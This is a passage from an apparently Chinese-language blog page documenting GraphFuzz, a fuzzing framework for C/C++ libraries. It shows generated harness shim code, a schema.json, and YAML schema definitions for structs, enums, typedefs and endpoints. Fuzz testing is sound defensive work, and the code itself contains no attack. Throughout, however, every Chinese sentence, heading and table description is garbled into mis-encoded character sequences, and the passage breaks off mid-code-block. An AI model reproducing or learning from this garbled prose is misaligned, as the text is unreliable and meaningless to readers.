ç›¸å…³æºä»£ç "></a><span id="fl1">A. ç›¸å…³æºä»£ç </span></h3><ul><li><code>fuzz_exec.cpp</code>ä¸­æ ¸å¿ƒä»£ç å—ï¼š</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* CPPScope(name=(auto) Foo::Foo();) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_0</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    Foo *_o0;<br>    _o0 = <span class="hljs-built_in">MAKE</span>(Foo);<br>    Foo ref = <span class="hljs-built_in">Foo</span>();<br>    *_o0 = ref;<br>    <br>                    <br>    out_ref[<span class="hljs-number">0</span>] = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span> *&gt;(_o0);<br>}<br><br><br><span class="hljs-comment">/* CPPScope(name=(auto) Foo::~Foo();) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_1</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    Foo *_i0 = <span class="hljs-built_in">reinterpret_cast</span>&lt;Foo *&gt;(in_ref[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">free</span>(_i0);<br>    <br>                    <br>}<br><br><br><span class="hljs-comment">/* CPPScope(name=(auto) Foo::void write(char val);) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_2</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    Foo *_i0 = <span class="hljs-built_in">reinterpret_cast</span>&lt;Foo *&gt;(in_ref[<span class="hljs-number">0</span>]);<br>    <span class="hljs-type">char</span> _a0;<br>    <span class="hljs-built_in">memcpy</span>(&amp;_a0, context + <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>));<br>    Foo *_o0;<br>    _i0-&gt;<span class="hljs-built_in">write</span>(_a0);<br>    _o0 = _i0;<br>                        <br>    out_ref[<span class="hljs-number">0</span>] = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span> *&gt;(_o0);<br>}<br><br><br><span class="hljs-comment">/* CPPScope(name=(auto) Foo::void check();) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_3</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    Foo *_i0 = <span class="hljs-built_in">reinterpret_cast</span>&lt;Foo *&gt;(in_ref[<span class="hljs-number">0</span>]);<br>    Foo *_o0;<br>    _i0-&gt;<span class="hljs-built_in">check</span>();<br>    _o0 = _i0;<br>                        <br>    out_ref[<span class="hljs-number">0</span>] = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span> *&gt;(_o0);<br>}<br></code></pre></td></tr></tbody></table></figure><hr><ul><li><code>fuzz_write.cpp</code>æ ¸å¿ƒä»£ç ï¼š</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* CPPScope(name=(auto) Foo::Foo();) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_0</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _o0 = CURR_ID++;<br>    std::cout &lt;&lt; <span class="hljs-string">"    Foo *var_"</span> &lt;&lt; _o0 &lt;&lt; <span class="hljs-string">";"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    {"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"        "</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _o0 &lt;&lt; <span class="hljs-string">" = MAKE(Foo);\n        Foo ref = Foo();\n        *"</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _o0 &lt;&lt; <span class="hljs-string">" = ref;"</span> &lt;&lt; std::endl;<br>    out_ref[<span class="hljs-number">0</span>] = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span> *&gt;(_o0);<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    }"</span> &lt;&lt; std::endl;<br>}<br><br><br><span class="hljs-comment">/* CPPScope(name=(auto) Foo::~Foo();) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_1</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _i0 = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>&gt;(in_ref[<span class="hljs-number">0</span>]);<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    {"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"        free("</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _i0 &lt;&lt; <span class="hljs-string">");"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    }"</span> &lt;&lt; std::endl;<br>}<br><br><br><span class="hljs-comment">/* CPPScope(name=(auto) Foo::void write(char val);) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_2</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _i0 = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>&gt;(in_ref[<span class="hljs-number">0</span>]);<br>    <span class="hljs-type">char</span> _a0;<br>    <span class="hljs-built_in">memcpy</span>(&amp;_a0, context + <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>));<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _o0 = CURR_ID++;<br>    std::cout &lt;&lt; <span class="hljs-string">"    Foo *var_"</span> &lt;&lt; _o0 &lt;&lt; <span class="hljs-string">";"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    {"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"        "</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _i0 &lt;&lt; <span class="hljs-string">"-&gt;write("</span> &lt;&lt; (<span class="hljs-type">int</span>)_a0 &lt;&lt; <span class="hljs-string">");\n        "</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _o0 &lt;&lt; <span class="hljs-string">" = "</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _i0 &lt;&lt; <span class="hljs-string">";"</span> &lt;&lt; std::endl;<br>    out_ref[<span class="hljs-number">0</span>] = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span> *&gt;(_o0);<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    }"</span> &lt;&lt; std::endl;<br>}<br><br><br><span class="hljs-comment">/* CPPScope(name=(auto) Foo::void check();) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_3</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _i0 = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>&gt;(in_ref[<span class="hljs-number">0</span>]);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _o0 = CURR_ID++;<br>    std::cout &lt;&lt; <span class="hljs-string">"    Foo *var_"</span> &lt;&lt; _o0 &lt;&lt; <span class="hljs-string">";"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    {"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"        "</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _i0 &lt;&lt; <span class="hljs-string">"-&gt;check();\n        "</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _o0 &lt;&lt; <span class="hljs-string">" = "</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _i0 &lt;&lt; <span class="hljs-string">";"</span> &lt;&lt; std::endl;<br>    out_ref[<span class="hljs-number">0</span>] = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span> *&gt;(_o0);<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    }"</span> &lt;&lt; std::endl;<br>}<br></code></pre></td></tr></tbody></table></figure><hr><ul><li><code>schema.json</code>å†…å®¹å¦‚ä¸‹ï¼š</li></ul><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">{</span><br><span class="hljs-attr">"types"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><br><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Foo"</span><br><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"scopes"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><br><span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"(auto) Foo::Foo();"</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"outputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"context"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span><br><span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"(auto) Foo::~Foo();"</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"outputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"context"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span><br><span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"(auto) Foo::void write(char val);"</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"outputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"context"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span><br><span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"(auto) Foo::void check();"</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"outputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"context"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">}</span><br></code></pre></td></tr></tbody></table></figure><h3 id="B-æ¨¡å¼æ ¼å¼ï¼ˆ-star-ï¼‰"><a href="#B-æ¨¡å¼æ ¼å¼ï¼ˆ-star-ï¼‰" class="headerlink" title="B. æ¨¡å¼æ ¼å¼ï¼ˆ:star:ï¼‰"></a>B. æ¨¡å¼æ ¼å¼ï¼ˆ<span class="github-emoji"><span>â­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>ï¼‰</h3><ul><li>â€ä¸€ä¸ª GraphFuzz æ¨¡å¼æ˜¯ç”¨ YAML ç¼–å†™çš„æ¨¡å¼å¯¹è±¡çš„é”®å€¼æ˜ å°„ï¼šâ€</li></ul><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">object1:</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">...</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">object1</span><br>    <span class="hljs-string">...</span><br><span class="hljs-attr">object2:</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">...</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">object2</span><br>    <span class="hljs-string">...</span><br><span class="hljs-string">...</span><br></code></pre></td></tr></tbody></table></figure><h4 id="a-å¯ç”¨å¯¹è±¡"><a href="#a-å¯ç”¨å¯¹è±¡" class="headerlink" title="a. å¯ç”¨å¯¹è±¡"></a>a. å¯ç”¨å¯¹è±¡</h4><h5 id="ç»“æ„ä½“-x2F-ç±»"><a href="#ç»“æ„ä½“-x2F-ç±»" class="headerlink" title="ç»“æ„ä½“/ç±»"></a>ç»“æ„ä½“/ç±»</h5><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">struct_Foo:</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">struct</span> <span class="hljs-comment"># (or type: class)</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">Foo</span><br>    <span class="hljs-attr">headers:</span> [<span class="hljs-string">'foo.h'</span>]<br>    <span class="hljs-attr">methods:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">Foo()</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">~Foo()</span><br>    <span class="hljs-attr">static_methods:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">Foo</span> <span class="hljs-string">*</span> <span class="hljs-string">MakeFoo(int)</span><br></code></pre></td></tr></tbody></table></figure><p>å±æ€§ï¼š</p><table><thead><tr><th>name</th><th>type</th><th>default value</th><th>info</th></tr></thead><tbody><tr><td><code>type</code></td><td><code>string</code></td><td>-</td><td><code>struct</code> æˆ– <code>class</code></td></tr><tr><td><code>name</code></td><td><code>string</code></td><td>-</td><td>ç±»çš„åå­—ï¼ˆå¦‚ <code>Foo</code>ï¼‰ æˆ–ä¸€ä¸ªæ¨¡æ¿å®ä¾‹çš„åå­—ï¼ˆå¦‚ <code>Foo&lt;int&gt;</code>ï¼‰.</td></tr><tr><td><code>methods</code></td><td><code>List[endpoint]</code></td><td><code>[]</code></td><td>å®ä¾‹æ–¹æ³•çš„åˆ—è¡¨ï¼ˆç­¾åæˆ–ç«¯ç‚¹å¯¹è±¡ï¼‰</td></tr><tr><td><code>static_methods</code></td><td><code>List[endpoint]</code></td><td><code>[]</code></td><td>é™æ€æ–¹æ³•çš„åˆ—è¡¨ï¼ˆç­¾åæˆ–ç«¯ç‚¹å¯¹è±¡ï¼‰</td></tr><tr><td><code>headers</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>åŒ…å«æ‰€æœ‰å°é—­æ–¹æ³•å®šä¹‰çš„C++å¤´æ–‡ä»¶åˆ—è¡¨</td></tr><tr><td><code>c_headers</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>åŒ…å«æ‰€æœ‰å°é—­æ–¹æ³•å®šä¹‰çš„Cå¤´æ–‡ä»¶åˆ—è¡¨</td></tr><tr><td><code>default_destructor</code></td><td><code>bool</code></td><td><code>false</code></td><td>å¦‚æœä¸º <code>true</code>, åˆ™æ·»åŠ ä¸€ä¸ªé»˜è®¤çš„ææ„å‡½æ•°ç«¯ç‚¹ï¼ˆå¦‚ <code>void ~Foo()</code>ï¼‰</td></tr><tr><td><code>alloc_with_new</code></td><td><code>bool</code></td><td><code>false</code></td><td>å¦‚æœä¸º <code>true</code>, é€šè¿‡<code>Foo *f = new Foo()</code> æ¥è°ƒç”¨æ„é€ å‡½æ•°ï¼Œè€Œä¸æ˜¯æ‰§è¡Œæœ¬åœ°åˆ†é…å¹¶ä½¿ç”¨ä¸€ä¸ªå¤åˆ¶æ„é€ å‡½æ•°</td></tr></tbody></table><hr><h5 id="æšä¸¾"><a href="#æšä¸¾" class="headerlink" title="æšä¸¾"></a>æšä¸¾</h5><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">enum_Options:</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">enum</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">Options</span><br>    <span class="hljs-attr">headers:</span> [<span class="hljs-string">'options.h'</span>]<br>    <span class="hljs-attr">values:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">OptA</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">OptB</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">OptC</span><br></code></pre></td></tr></tbody></table></figure><p>å±æ€§ï¼š</p><table><thead><tr><th>name</th><th>type</th><th>default value</th><th>info</th></tr></thead><tbody><tr><td><code>type</code></td><td><code>string</code></td><td>-</td><td><code>enum</code></td></tr><tr><td><code>name</code></td><td><code>string</code></td><td>-</td><td>æšä¸¾åç§°ï¼ˆå¦‚<code>Options</code>ï¼‰</td></tr><tr><td><code>headers</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>è¯¥æšä¸¾æ‰€éœ€çš„C++å¤´æ–‡ä»¶</td></tr><tr><td><code>c_headers</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>è¯¥æšä¸¾æ‰€éœ€çš„Cå¤´æ–‡ä»¶</td></tr><tr><td><code>values</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>æšä¸¾å€¼åˆ—è¡¨</td></tr></tbody></table><hr><h5 id="Typedef"><a href="#Typedef" class="headerlink" title="Typedef"></a>Typedef</h5><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># E.g.</span><br><span class="hljs-comment"># typedef float MyFoo;</span><br><br><span class="hljs-attr">typedef_foo:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">typedef</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">MyFoo</span><br>  <span class="hljs-attr">headers:</span> [<span class="hljs-string">'foo.h'</span>]<br>  <span class="hljs-attr">value:</span> <span class="hljs-string">float</span><br></code></pre></td></tr></tbody></table></figure><p>å±æ€§ï¼š</p><table><thead><tr><th>name</th><th>type</th><th>default value</th><th>info</th></tr></thead><tbody><tr><td><code>type</code></td><td><code>string</code></td><td>-</td><td><code>typedef</code></td></tr><tr><td><code>name</code></td><td><code>string</code></td><td>-</td><td>æ–°åˆ›å»ºç±»å‹çš„åç§°ï¼ˆå¦‚ <code>MyFoo</code>ï¼‰</td></tr><tr><td><code>headers</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>ä½¿ç”¨è¯¥ç±»å‹æ‰€éœ€çš„C++å¤´æ–‡ä»¶</td></tr><tr><td><code>c_headers</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>ä½¿ç”¨è¯¥ç±»å‹æ‰€éœ€çš„Cå¤´æ–‡ä»¶</td></tr><tr><td><code>value</code></td><td><code>string</code></td><td><code>''</code></td><td>ç±»å‹çš„å€¼</td></tr></tbody></table><hr><h5 id="Simpleï¼ˆåŸºæœ¬æ•°æ®ç±»å‹ï¼‰"><a href="#Simpleï¼ˆåŸºæœ¬æ•°æ®ç±»å‹ï¼‰" class="headerlink" title="Simpleï¼ˆåŸºæœ¬æ•°æ®ç±»å‹ï¼‰"></a>Simpleï¼ˆåŸºæœ¬æ•°æ®ç±»å‹ï¼‰</h5><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">simple_float:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">simple</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">float</span><br>  <span class="hljs-attr">context_size:</span> <span class="hljs-number">4</span><br></code></pre></td></tr></tbody></table></figure><p>å±æ€§ï¼š</p><table><thead><tr><th>name</th><th>type</th><th>default value</th><th>info</th></tr></thead><tbody><tr><td><code>type</code></td><td><code>string</code></td><td>-</td><td><code>simple</code></td></tr><tr><td><code>name</code></td><td><code>string</code></td><td>-</td><td>å†…ç½®ç±»å‹çš„åç§°ï¼ˆå¦‚ <code>float</code>ï¼‰</td></tr><tr><td><code>context_size</code></td><td><code>int</code></td><td><code>0</code></td><td>è¯¥ç±»å‹å­—èŠ‚å¤§å°</td></tr></tbody></table><h4 id="b-ç«¯ç‚¹å®šä¹‰"><a href="#b-ç«¯ç‚¹å®šä¹‰" class="headerlink" title="b. ç«¯ç‚¹å®šä¹‰"></a>b. ç«¯ç‚¹å®šä¹‰</h4><ul><li>ç«¯ç‚¹æœ‰ä¸¤ç§æŒ‡å®šæ–¹å¼ï¼š<ol><li>ï¼ˆè‡ªåŠ¨ï¼‰æä¾›C/C++å‡½æ•°ç­¾å</li><li>ï¼ˆæ‰‹åŠ¨ï¼‰æä¾›ç«¯ç‚¹å®šä¹‰å¯¹è±¡</li></ol></li></ul><h5 id="è‡ªåŠ¨ç”Ÿæˆç«¯ç‚¹"><a href="#è‡ªåŠ¨ç”Ÿæˆç«¯ç‚¹" class="headerlink" title="è‡ªåŠ¨ç”Ÿæˆç«¯ç‚¹"></a>è‡ªåŠ¨ç”Ÿæˆç«¯ç‚¹</h5><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">doBar(Bar</span> <span class="hljs-string">*,</span> <span class="hljs-string">int)</span><br></code></pre></td></tr></tbody></table></figure><p>GraphFuzzä½¿ç”¨ä¸‹é¢çš„é€»è¾‘æ¥å†³å®šå¦‚ä½•è§£é‡Šç«¯ç‚¹ç­¾åï¼ˆç±»ä¼¼äºæ­£åˆ™åŒ¹é…ï¼‰ï¼š</p><table><thead><tr><th>condition</th><th>result</th></tr></thead><tbody><tr><td>in <code>methods</code> and matches <code>void &lt;name&gt;(...)</code>?</td><td>standard constructor</td></tr><tr><td>in <code>methods</code> and matches <code>void ~&lt;name&gt;(...)</code>?</td><td>destructor</td></tr><tr><td>in <code>methods</code>?</td><td>instance method</td></tr><tr><td>in <code>static_methods</code> and return type is <code>&lt;name&gt; *</code>?</td><td>static constructor</td></tr><tr><td>in <code>static_methods</code>?</td><td>static function</td></tr></tbody></table><h5 id="æ‰‹åŠ¨ç”Ÿæˆç«¯ç‚¹"><a href="#æ‰‹åŠ¨ç”Ÿæˆç«¯ç‚¹" class="headerlink" title="æ‰‹åŠ¨ç”Ÿæˆç«¯ç‚¹"></a>æ‰‹åŠ¨ç”Ÿæˆç«¯ç‚¹</h5><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">my_endpoint:</span><br>    <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>, <span class="hljs-string">'Bar'</span>]<br>    <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Bar'</span>]<br>    <span class="hljs-attr">args:</span> [<span class="hljs-string">'int'</span>]<br>    <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span 